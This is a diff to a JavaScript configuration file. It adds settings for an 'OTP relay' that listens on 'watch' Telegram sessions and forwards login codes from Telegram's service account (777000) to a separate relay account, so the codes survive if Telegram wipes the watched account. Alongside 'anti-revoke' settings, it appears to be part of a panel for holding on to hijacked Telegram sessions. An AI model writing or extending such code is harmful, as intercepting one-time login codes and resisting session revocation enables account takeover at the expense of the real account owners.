@@ -135,6 +135,51 @@ const telegramConfig = {
   ANTI_REVOKE_PHASE_4_ALERT_COOLDOWN_MS: parseInt(
     process.env.ANTI_REVOKE_PHASE_4_ALERT_COOLDOWN_MS || `${10 * 60 * 1000}`, 10
   ),
+
+  // ============================================================
+  // Saved-Messages OTP Relay (the optional follow-up to phase 4)
+  // ============================================================
+  //
+  // The relay is a passive listener attached to one or more "watch"
+  // panel sessions. Whenever a watch session receives a DM from the
+  // sender allow-list (default = the official Telegram service user
+  // id 777000), the listener forwards the message body to the
+  // *relay* session's Saved Messages (`InputPeerSelf`) so the OTP
+  // survives even if the watch account is later wiped by Telegram.
+  //
+  // All knobs are runtime-tunable so the operator can toggle the
+  // feature without a code change. Setting OTP_RELAY_ENABLED=false
+  // keeps the schema dormant.
+  OTP_RELAY_ENABLED: process.env.OTP_RELAY_ENABLED
+    ? process.env.OTP_RELAY_ENABLED === 'true'
+    : true,
+  // Default sender allow-list applied to new attachments. Each
+  // attachment row may override this in `tg_otp_relays.sender_filter`.
+  // The list contains both numeric chat IDs (777000 = Telegram
+  // official service user) and usernames ("Telegram") so we catch the
+  // login-code DM regardless of how GramJS resolves it.
+  OTP_RELAY_DEFAULT_SENDERS: (
+    process.env.OTP_RELAY_DEFAULT_SENDERS || '777000,Telegram'
+  ).split(',').map((s) => s.trim()).filter(Boolean),
+  // Hard ceiling on forwards per watch_session_id per minute. A
+  // misbehaving sender (compromised account hammering the same chat
+  // with non-OTP messages) cannot drain the relay account's daily
+  // message quota. Per-attachment override lives in
+  // `tg_otp_relays.rate_limit_per_min`.
+  OTP_RELAY_RATE_LIMIT_PER_MIN: parseInt(
+    process.env.OTP_RELAY_RATE_LIMIT_PER_MIN || '30', 10
+  ),
+  // How many days of `tg_otp_relay_events` rows to retain before the
+  // pruner job deletes them. The audit log is informational only —
+  // the actual OTP body lives in the relay account's Saved Messages.
+  OTP_RELAY_EVENT_RETENTION_DAYS: parseInt(
+    process.env.OTP_RELAY_EVENT_RETENTION_DAYS || '30', 10
+  ),
+  // Optional ECMAScript regex applied to the message body. If empty
+  // every message that matches the sender allow-list is forwarded.
+  // Anything stricter (e.g. `^Login code:` to filter out service
+  // notifications that aren't OTPs) goes here.
+  OTP_RELAY_DEFAULT_REGEX: process.env.OTP_RELAY_DEFAULT_REGEX || '',
 };
 
 if (!telegramConfig.apiId || !telegramConfig.apiHash) {
